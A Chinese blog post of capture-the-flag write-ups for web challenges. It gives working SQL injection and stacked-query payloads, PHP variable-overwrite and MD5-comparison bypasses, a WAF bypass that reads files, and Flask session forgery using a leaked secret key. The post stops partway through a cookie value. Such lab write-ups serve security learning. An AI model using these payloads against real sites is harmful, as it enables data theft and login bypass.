<meta property="og:image" content="https://img.npfs06.top/20210322184939.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10">
<meta property="og:image" content="https://img.npfs06.top/20210322183659.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10">
<meta property="og:image" content="https://img.npfs06.top/20210322183823.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10">
<meta property="og:image" content="https://img.npfs06.top/20210324222013.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10">
<meta property="og:image" content="https://img.npfs06.top/20210324222340.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10">
<meta property="og:image" content="https://img.npfs06.top/20210324223039.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10">
<meta property="og:image" content="https://img.npfs06.top/20210324223213.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10">
<meta property="og:image" content="https://img.npfs06.top/20210324224141.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10">
<meta property="og:image" content="https://img.npfs06.top/20210324224333.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10">
<meta property="og:image" content="https://img.npfs06.top/20210324224910.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10">
<meta property="og:image" content="https://img.npfs06.top/20210324221829.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10">
<meta property="og:image" content="https://img.npfs06.top/20210324225143.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10">
<meta property="og:image" content="https://img.npfs06.top/20210324235635.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10">
<meta property="og:image" content="https://img.npfs06.top/20210325000340.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10">
<meta property="og:image" content="https://img.npfs06.top/20210326161153.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10">
<meta property="og:image" content="https://img.npfs06.top/20210327160926.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10">
<meta property="og:image" content="https://img.npfs06.top/20210327160618.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10">
<meta property="og:image" content="https://img.npfs06.top/20210327221043.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10">
<meta property="og:image" content="https://img.npfs06.top/20210327221533.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10">
<meta property="og:image" content="https://img.npfs06.top/20210328181734.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10">
<meta property="og:image" content="http://img.npfs06.top/20210328181758.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10">
<meta property="og:image" content="https://img.npfs06.top/20210328182806.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10">
<meta property="og:image" content="https://img.npfs06.top/20210330194306.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10">
<meta property="og:image" content="http://img.npfs06.top/20210330195657.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10">
<meta property="og:image" content="https://img.npfs06.top/20210330195725.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10">
<meta property="og:image" content="https://img.npfs06.top/20210331191241.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10">
<meta property="og:image" content="https://img.npfs06.top/20210331190910.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10">
<meta property="og:image" content="https://img.npfs06.top/20210331195107.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10">
<meta property="og:image" content="https://img.npfs06.top/20210331185008.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10">
<meta property="article:published_time" content="2021-02-01T09:57:02.000Z">
<meta property="article:modified_time" content="2021-03-25T07:27:54.000Z">
<meta property="article:author" content="安小琪">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://img.npfs06.top/20210413233059.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10">

<link rel="canonical" href="https://npfs06.top/posts/%E5%AF%92%E5%81%87buu30%E8%A7%A3%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : false,
    lang   : 'en'
  };
</script>

  <title>buu30解刷题记录 | 安小琪's blog
</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">安小琪's blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">少年有梦，不应止于心动</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="Searching..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <a role="button" class="book-mark-link book-mark-link-fixed"></a>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          
  
  

          <div class="content page posts-expand">
            

    
    
    
    <div class="post-block" lang="en">
      <header class="post-header">

<h1 class="post-title" itemprop="name headline">buu30解刷题记录
</h1>

<div class="post-meta">
  

</div>

</header>

      
      
      
      <div class="post-body">
          <p>记录一些在刷题过程中，发现的一些有趣的题目</p>
<a id="more"></a>


<h2 id="忘记哪题了"><a href="#忘记哪题了" class="headerlink" title="(忘记哪题了)"></a>(忘记哪题了)</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * <span class="keyword">from</span><span class="built_in"> users </span>where <span class="attribute">username</span>=<span class="string">&#x27;$_POST[&quot;username&quot;]&#x27;</span> <span class="keyword">and</span> <span class="attribute">password</span>=<span class="string">&#x27;$_POST[&quot;password&quot;]&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>显示了后端的SQL语句，我们可以使用\转义符转义username后面的引号，令username的第一个引号和password的第一个引号闭合，逃逸出password第一个引号后面的内容</p>
<p>如输入</p>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">username</span>=admin\</span><br><span class="line"><span class="attr">password</span>=or <span class="number">1</span><span class="comment">#</span></span><br></pre></td></tr></table></figure>
<p>　　数据库查询语句事实上变成了这样：</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * <span class="keyword">from</span><span class="built_in"> users </span>where <span class="attribute">username</span>=<span class="string">&#x27;admin\&#x27;</span> <span class="keyword">and</span> <span class="attribute">password</span>=<span class="string">&#x27;or 1#&#x27;</span>;</span><br></pre></td></tr></table></figure>




<hr>
<h2 id="（忘记哪题了）"><a href="#（忘记哪题了）" class="headerlink" title="（忘记哪题了）"></a>（忘记哪题了）</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$yds</span> = <span class="string">&quot;dog&quot;</span>;</span><br><span class="line"><span class="variable">$is</span> = <span class="string">&quot;cat&quot;</span>;</span><br><span class="line"><span class="variable">$handsome</span> = <span class="string">&#x27;yds&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="variable">$x</span> &amp;&amp; <span class="variable">$x</span> !== <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="variable">$handsome</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$yds</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>  || <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$is</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;the flag is: &quot;</span>.<span class="variable">$flag</span>;</span><br></pre></td></tr></table></figure>
<ol>
<li>?yds=flag</li>
<li>?is=flag&amp;flag=flag</li>
</ol>
<hr>
<h2 id="（忘记哪题了）-1"><a href="#（忘记哪题了）-1" class="headerlink" title="（忘记哪题了）"></a>（忘记哪题了）</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&#x27;123abc&#x27;</span>;</span><br><span class="line"><span class="keyword">print</span>(preg_replace(<span class="string">&#x27;/(\S)(\S)/i&#x27;</span>,<span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,<span class="variable">$str</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>=》  <code>strtolower(&quot;1&quot;)strtolower(&quot;3&quot;)strtolower(&quot;b&quot;)</code></p>
<hr>
<h2 id="（忘记哪题了）-2"><a href="#（忘记哪题了）-2" class="headerlink" title="（忘记哪题了）"></a>（忘记哪题了）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if((string)$_POST[&#39;param1&#39;]!&#x3D;&#x3D;(string)$_POST[&#39;param2&#39;] &amp;&amp; md5($_POST[&#39;param1&#39;])&#x3D;&#x3D;&#x3D;md5($_POST[&#39;param2&#39;]))&#123;</span><br><span class="line">                    die(&quot;success!);&#125;</span><br></pre></td></tr></table></figure>
<p>param1=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3Bu%93%D8Igm%A0%D1U%5D%83%60%FB%07%FE%A2&amp;param2=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB%07%FE%A2</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;param1&#x27;</span>]!==<span class="variable">$_POST</span>[<span class="string">&#x27;param2&#x27;</span>] &amp;&amp; md5(<span class="variable">$_POST</span>[<span class="string">&#x27;param1&#x27;</span>])===md5(<span class="variable">$_POST</span>[<span class="string">&#x27;param2&#x27;</span>]))&#123;</span><br><span class="line">                            <span class="keyword">die</span>(<span class="string">&quot;success!&quot;</span>);</span><br><span class="line">                        &#125;</span><br></pre></td></tr></table></figure>
<p>param1[]=QNKCDZO&amp;param2[]=240610708</p>
<hr>
<h2 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">alter table words rename to word;</span><br><span class="line">将words表重命名为word</span><br><span class="line"></span><br><span class="line">alter table`<span class="number">1919810931114514</span>` rename to words;</span><br><span class="line">将<span class="number">1919810931114514</span>表重命名为words</span><br><span class="line"></span><br><span class="line"><span class="function">alter table words change flag data <span class="title">varchar</span><span class="params">(<span class="number">100</span>)</span></span>;</span><br><span class="line">将表words（原表<span class="number">1919810931114514</span>）中的列名flag改为data</span><br><span class="line"></span><br><span class="line">alter table words add column id int(10) default 1 --+</span><br><span class="line">在words表中插入id列</span><br></pre></td></tr></table></figure>


<p>预处理语句使用方式：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">PREPARE</span> name <span class="keyword">from</span> <span class="string">&#x27;[my sql sequece]&#x27;</span>;   <span class="operator">/</span><span class="operator">/</span>预定义<span class="keyword">SQL</span>语句</span><br><span class="line"><span class="keyword">EXECUTE</span> name;  <span class="operator">/</span><span class="operator">/</span>执行预定义<span class="keyword">SQL</span>语句</span><br><span class="line">(<span class="keyword">DEALLOCATE</span> <span class="operator">||</span> <span class="keyword">DROP</span>) <span class="keyword">PREPARE</span> name;  <span class="operator">/</span><span class="operator">/</span>删除预定义<span class="keyword">SQL</span>语句</span><br></pre></td></tr></table></figure>
<p>预定义语句也可以通过变量进行传递:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SET</span> <span class="variable">@tn</span> <span class="operator">=</span> <span class="string">&#x27;hahaha&#x27;</span>;  <span class="operator">/</span><span class="operator">/</span>存储表名</span><br><span class="line"><span class="keyword">SET</span> <span class="variable">@sql</span> <span class="operator">=</span> concat(<span class="string">&#x27;select * from &#x27;</span>, <span class="variable">@tn</span>);  <span class="operator">/</span><span class="operator">/</span>存储<span class="keyword">SQL</span>语句</span><br><span class="line"><span class="keyword">PREPARE</span> name <span class="keyword">from</span> <span class="variable">@sql</span>;   <span class="operator">/</span><span class="operator">/</span>预定义<span class="keyword">SQL</span>语句</span><br><span class="line"><span class="keyword">EXECUTE</span> name;  <span class="operator">/</span><span class="operator">/</span>执行预定义<span class="keyword">SQL</span>语句</span><br><span class="line">(<span class="keyword">DEALLOCATE</span> <span class="operator">||</span> <span class="keyword">DROP</span>) <span class="keyword">PREPARE</span> sqla;  <span class="operator">/</span><span class="operator">/</span>删除预定义<span class="keyword">SQL</span>语句</span><br></pre></td></tr></table></figure>
<p>payload:</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">1</span>&#x27;;PREPARE jwt from concat(char(<span class="number">115</span>,<span class="number">101</span>,<span class="number">108</span>,<span class="number">101</span>,<span class="number">99</span>,<span class="number">116</span>), &#x27; * from `<span class="number">1919810931114514</span>` &#x27;);EXECUTE jwt;#</span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;;SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;#</span></span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;;SET @sql=concat(char(115,101,108,101,99,116),&quot; * from `1919810931114514`&quot;);PREPARE sqla from @sql;EXECUTE sqla;#</span></span><br></pre></td></tr></table></figure>
<hr>
<h2 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h2><p>1.尝试 `‘   ’‘   ）   ))    ‘)     “)     ‘))   “)),找不到字符型注入点</p>
<p>2.输入不等于0的数字返回 1 ；输入过滤了的字符返回 Nonono；输入其他字符空白无显示；</p>
<p>3.尝试堆叠注入，<code>1;show tables;#</code>时返回如下：</p>
<p>   Array ( [0] =&gt; 1) Array ( [0] =&gt; Flag )</p>
<p>推测其执行语句为<code>select GET[&#39;query&#39;] || flag from Flag</code></p>
<p>4.flag被过滤（还有好多都被过滤了哈）</p>
<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">5</span>.重点来了</span><br><span class="line">oracle 支持 通过 ‘ <span class="string">|| ’ 来实现字符串拼接，但在mysql 不支持。 在mysql里，它只是个 或运算 的符号。或运算符前面是1，则结果为1；或运算符前面是0，则要看后面是1还是0，字符视为0.</span></span><br><span class="line">但是我们可以通过设置 sql_mode=pipes_as_concat; 来使  <span class="string">||  用作拼接的作用</span></span><br></pre></td></tr></table></figure>
<p><img src="https://img.npfs06.top/20210413233059.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">在这里我们可以传入  1;<span class="builtin-name">set</span> <span class="attribute">sql_mode</span>=pipes_as_concat;select *,1</span><br><span class="line">其真正的执行语句是  select 1;<span class="builtin-name">set</span> <span class="attribute">sql_mode</span>=pipes_as_concat;select *,1 || flag <span class="keyword">from</span> Flag</span><br><span class="line">这样就可以把 1和flag仪器显示出来</span><br></pre></td></tr></table></figure>


<hr>
<h2 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h2><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Tornado框架的附属文件<span class="keyword">handler</span>.settings中存在cookie_secret</span><br></pre></td></tr></table></figure>
<p><a href="https://xz.aliyun.com/t/2908" target="_blank">Python中从服务端模板注入到沙盒逃逸的源码探索 (一)</a></p>
<hr>
<h2 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">var_dump</span><span class="params">()</span></span> 将变量以字符串形式输出，替代print和echo</span><br><span class="line"><span class="function"><span class="title">chr</span><span class="params">()</span></span> ASCII范围的整数转字符</span><br><span class="line"><span class="function"><span class="title">file_get_contents</span><span class="params">()</span></span> 顾名思义获取一个文件的内容，替代system(<span class="string">&#x27;cat flag;&#x27;</span>)</span><br><span class="line"><span class="function"><span class="title">scandir</span><span class="params">()</span></span> 扫描某个目录并将结果以array形式返回，配和var_dump 可以替代system(<span class="string">&#x27;ls;&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p><a href="https://www.freebuf.com/column/207936.html" target="_blank">利用PHP的字符串解析特性绕过安全防护软件</a></p>
<p>1.利用php字符串解析特性绕过WAF</p>
<p>2.<code>var_dump(scandir(chr(47)))</code>，查看根目录  （ \ 的ascii为47）</p>
<p>发现   [7]=&gt; string(5) “f1agg” </p>
<p>3.file_get_contents()读取文件<br><code>? num=file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))</code></p>
<hr>
<h2 id="HCTF-2018-admin-Flask-session伪造"><a href="#HCTF-2018-admin-Flask-session伪造" class="headerlink" title="[HCTF 2018]admin  Flask session伪造"></a>[HCTF 2018]admin  Flask session伪造</h2><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">session</span>是浏览器与服务器交互的会话，这个<span class="keyword">session</span>可以来验证访问者的身份，大多数的<span class="keyword">session</span>都是保存在服务器的，但是也有少部分是客户端<span class="keyword">session</span>，比如flask框架。，flask是一个python轻量级web框架，他的<span class="keyword">session</span>存储在客户端的cookie字段中</span><br></pre></td></tr></table></figure>
<p>在该题就是要伪造session，欺骗服务器，假装自己就是admin</p>
<p>从题目给的hint <a target="_blank" rel="noopener" href="https://github.com/woadsl1234/hctf_flask/%EF%BC%88change">https://github.com/woadsl1234/hctf_flask/（change</a> password 页面查看源码）</p>
<p>伪造session,需要用来签名的<code>SECRET_KEY</code>，可以在config.py里找到为ckj123</p>
<p><a href="https://github.com/noraj/flask-session-cookie-manager" target="_blank">session加解密脚本</a></p>
<p>这里首先要随便注册一个账号，得到session</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">session</span>=.eJw<span class="number">9</span>kE<span class="number">2</span>LwjAURf_KkLWLNqMbwYUQLS<span class="number">28</span>hEhqyNuI<span class="number">1</span>jpp<span class="number">0</span>jhDq_RD_O_TccDVXRzugXsf<span class="number">5</span>HBpytaS<span class="number">5</span>a<span class="number">25</span>lzNyqM<span class="number">5</span>k-SAfJ<span class="number">7</span>IkoNAJdnYYcgph<span class="number">8</span>yn<span class="number">0</span>thJsb<span class="number">80</span>oKTqYG<span class="number">5</span>XVEDIvNPRCQQeuGECbSDBrRZJZSKae<span class="number">851</span>gsscAFHU<span class="number">6</span>iiTtuUsjrmHkbB<span class="number">2</span>hKhYTH<span class="number">9</span>DZGpzshKo<span class="number">9</span>BjMIlVXA<span 